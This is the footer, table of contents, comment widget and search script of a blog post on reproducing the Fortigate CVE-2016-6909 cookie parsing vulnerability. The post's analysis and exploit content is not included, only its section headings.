              <i class="iconfont icon-updatetime" title="更新时间"></i>
              2021-08-10 17:42:05
            </span>
            
                  <span class="post-categories">
                    <i class="iconfont icon-bookmark" title="分类"></i>
                    
                    <span class="span--category">
                      <a href="/categories/CVE/" title="CVE">
                        <b>#</b> CVE
                      </a>
                    </span>
                    
                  </span>
              
                  <span class="post-tags">
                    <i class="iconfont icon-tags" title="标签"></i>
                    
                    <span class="span--tag">
                      <a href="/tags/Pwn/" title="Pwn">
                        <b>#</b> Pwn
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/CVE/" title="CVE">
                        <b>#</b> CVE
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/Linux/" title="Linux">
                        <b>#</b> Linux
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/ret2text/" title="ret2text">
                        <b>#</b> ret2text
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/ROP/" title="ROP">
                        <b>#</b> ROP
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" title="栈溢出">
                        <b>#</b> 栈溢出
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/ret2shellcode/" title="ret2shellcode">
                        <b>#</b> ret2shellcode
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/shellcode/" title="shellcode">
                        <b>#</b> shellcode
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/Fortigate/" title="Fortigate">
                        <b>#</b> Fortigate
                      </a>
                    </span>
                    
                  </span>
              
          </div>
          <div class="post-foot-prev">
            
              <a href="/2021/08/17/CVE-0X04-CVE-2020-27867/" target="_self">
                <span>下一页</span>
                <i class="iconfont icon-chevronright"></i>
              </a>
            
          </div>
        </div>
      
    </div>
    
  <div id="btn-catalog" class="btn-catalog">
    <i class="iconfont icon-catalog"></i>
  </div>
  <div class="post-catalog hidden" id="catalog">
    <div class="title">目录</div>
    <div class="catalog-content">
      
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-%E4%B8%80%E5%88%87%E5%BC%80%E5%A7%8B%E4%B9%8B%E5%89%8D"><span class="toc-text">0x00.一切开始之前</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-text">漏洞影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%99%BB%E5%85%A5-fortigate-VM"><span class="toc-text">登入 fortigate VM</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E9%97%A8%E6%8C%87%E4%BB%A4"><span class="toc-text">后门指令</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">0x01.漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%8F%90%E5%8F%96"><span class="toc-text">文件提取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-text">启动过程分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#I-init-%E8%BF%9B%E7%A8%8B"><span class="toc-text">I. init 进程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#II-bin-%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90"><span class="toc-text">II. bin 目录文件分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#III-x2F-bin-x2F-init-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="toc-text">III. &#x2F;bin&#x2F;init 逆向分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#poc"><span class="toc-text">poc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9A%E4%BD%8D%E6%BA%A2%E5%87%BA%E7%82%B9"><span class="toc-text">定位溢出点</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">0x02.漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2text"><span class="toc-text">ret2text</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2shellcode"><span class="toc-text">ret2shellcode</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-What%E2%80%99s-more%E2%80%A6"><span class="toc-text">0x03.What’s more…</span></a></li></ol>
      
    </div>
  </div>

  
<script src="/js/catalog.js"></script>




    
      <div class="comments-container">
        




  
    <script async type="text/javascript" src="/plugins/valine.min.js" onload="loadValineSuc(this)"></script>
  

  <div id="vcomments"></div>

  <script>
    function loadValineSuc() {
      new Valine({
        el: '#vcomments',
        appId: 'ICj6cPRQWFTNiOttBHlzxnIv-gzGzoHsz',
        appKey: 'tuvJh3xYxPFcW2JB6K26RKP2',
        placeholder: '说点什么呗...',
        avatar: 'retro',
        lang: 'zh-CN'
      })
    }
  </script>

    <style>
      .comments-container .v .vempty {
        display: none!important;
      }
    </style>




      </div>
    
  </div>


        
<div class="footer">
  <div class="social">
    <ul>
      
        <li>
          <a title="github" target="_blank" rel="noopener" href="https://github.com/arttnba3">
            <i class="iconfont icon-github"></i>
          </a>
        </li>
      
        <li>
          <a title="email" href="mailto:arttnba@gmail.com">
            <i class="iconfont icon-envelope"></i>
          </a>
        </li>
      
        <li>
          <a title="twitter" target="_blank" rel="noopener" href="https://twitter.com/arttnba3">
            <i class="iconfont icon-twitter"></i>
          </a>
        </li>
      
        <li>
          <a title="rss" href="/atom.xml">
            <i class="iconfont icon-rss"></i>
          </a>
        </li>
      
    </ul>
  </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/arttnba3">Copyright © 2022 arttnba3</a>
        
    </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
        
    </div>
  
</div>

      </div>

      <div class="tools-bar">
        <div class="back-to-top tools-bar-item hidden">
  <a href="javascript: void(0)">
    <i class="iconfont icon-chevronup"></i>
  </a>
</div>


<script src="/js/backtotop.js"></script>



        
  <div class="search-icon tools-bar-item" id="search-icon">
    <a href="javascript: void(0)">
      <i class="iconfont icon-search"></i>
    </a>
  </div>

  <div class="search-overlay hidden">
    <div class="search-content" tabindex="0">
      <div class="search-title">
        <span class="search-icon-input">
          <a href="javascript: void(0)">
            <i class="iconfont icon-search"></i>
          </a>
        </span>
        
          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
        
        <span class="search-close-icon" id="search-close-icon">
          <a href="javascript: void(0)">
            <i class="iconfont icon-close"></i>
          </a>
        </span>
      </div>
      <div class="search-result" id="search-result"></div>
    </div>
  </div>

  <script type="text/javascript">
    var inputArea = document.querySelector("#search-input")
    var searchOverlayArea = document.querySelector(".search-overlay")

    inputArea.onclick = function() {
      getSearchFile()
      this.onclick = null
    }

    inputArea.onkeydown = function() {
      if(event.keyCode == 13)
        return false
    }

    function openOrHideSearchContent() {
      let isHidden = searchOverlayArea.classList.contains('hidden')
      if (isHidden) {
        searchOverlayArea.classList.remove('hidden')
        document.body.classList.add('hidden')
        // inputArea.focus()
      } else {
        searchOverlayArea.classList.add('hidden')
        document.body.classList.remove('hidden')
      }
    }

    function blurSearchContent(e) {
      if (e.target === searchOverlayArea) {
        openOrHideSearchContent()
      }
    }

    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
    searchOverlayArea.addEventListener("click", blurSearchContent, false)

    var searchFunc = function (path, search_id, content_id) {
      'use strict';
      var $input = document.getElementById(search_id);
      var $resultContent = document.getElementById(content_id);
      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
      $.ajax({
        // 0x01. load xml file
        url: path,
        dataType: "xml",
        success: function (xmlResponse) {
          // 0x02. parse xml file
          var datas = $("entry", xmlResponse).map(function () {
            return {
              title: $("title", this).text(),
              content: $("content", this).text(),
              url: $("url", this).text()
            };
          }).get();
          $resultContent.innerHTML = "";

          $input.addEventListener('input', function () {
            // 0x03. parse query to keywords list
            var str = '<ul class=\"search-result-list\">';
            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
            $resultContent.innerHTML = "";
            if (this.value.trim().length <= 0) {
              return;
            }
            // 0x04. perform local searching
            datas.forEach(function (data) {
              var isMatch = true;
              var content_index = [];
              if (!data.title || data.title.trim() === '') {
                data.title = "Untitled";
              }
              var orig_data_title = data.title.trim();
              var data_title = orig_data_title.toLowerCase();
              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
              var data_content = orig_data_content.toLowerCase();
              var data_url = data.url;
              var index_title = -1;
              var index_content = -1;
              var first_occur = -1;
              // only match artiles with not empty contents
              if (data_content !== '') {
                keywords.forEach(function (keyword, i) {
                  index_title = data_title.indexOf(keyword);
                  index_content = data_content.indexOf(keyword);

                  if (index_title < 0 && index_content < 0) {
                    isMatch = false;
                  } else {
                    if (index_content < 0) {
                      index_content = 0;
                    }
                    if (i == 0) {
                      first_occur = index_content;
                    }
                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
                  }
                });
              } else {
                isMatch = false;
              }
              // 0x05. show search results
              if (isMatch) {
                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
                var content = orig_data_content;
                if (first_occur >= 0) {
                  // cut out 100 characters
                  var start = first_occur - 20;
                  var end = first_occur + 80;

                  if (start < 0) {
                    start = 0;
                  }

                  if (start == 0) {
                    end = 100;
                  }

                  if (end > content.length) {
                    end = content.length;
                  }

                  var match_content = content.substr(start, end);

                  // highlight all keywords
                  keywords.forEach(function (keyword) {
                    var regS = new RegExp(keyword, "gi");
                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
                  });

                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
                }
                str += "</li>";
              }
            });
            str += "</ul>";
            if (str.indexOf('<li>') === -1) {
              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
            }
            $resultContent.innerHTML = str;
          });
        },
        error: function(xhr, status, error) {
          $resultContent.innerHTML = ""
          if (xhr.status === 404) {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
          } else {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
          }
        }
      });
      $(document).on('click', '#search-close-icon', function() {
        $('#search-input').val('');
        $('#search-result').html('');
      });
    }

    var getSearchFile = function() {
        var path = "/search.xml";
        searchFunc(path, 'search-input', 'search-result');
    }
  </script>




        
  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
    <a href="javascript: void(0)">
      <i id="theme-icon" class="iconfont icon-moon"></i>
    </a>
  </div>

  
<script src="/js/colorscheme.js"></script>





        
  
    <div class="share-icon tools-bar-item">
      <a href="javascript: void(0)" id="share-icon">
        <i class="iconfont iconshare"></i>
      </a>
      <div class="share-content hidden">
        
          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E3%80%90CVE.0x03%E3%80%91CVE-2016-6909%20Fortigate%20%E9%98%B2%E7%81%AB%E5%A2%99%20Cookie%20%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E7%AE%80%E8%A6%81%E5%88%86%E6%9E%90 + '&url=' + http%3A%2F%2Fblog.arttnba3.cn%2F2021%2F08%2F10%2FCVE-0X03-CVE-2016-6909%2F + '" target="_blank" title="Twitter">
            <i class="iconfont icon-twitter"></i>
          </a>
        
        
          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://blog.arttnba3.cn/2021/08/10/CVE-0X03-CVE-2016-6909/" target="_blank" title="Facebook">
            <i class="iconfont icon-facebooksquare"></i>
          </a>
        
      </div>
    </div>
  
  
<script src="/js/shares.js"></script>



      </div>
    </div>
  </body>
</html>
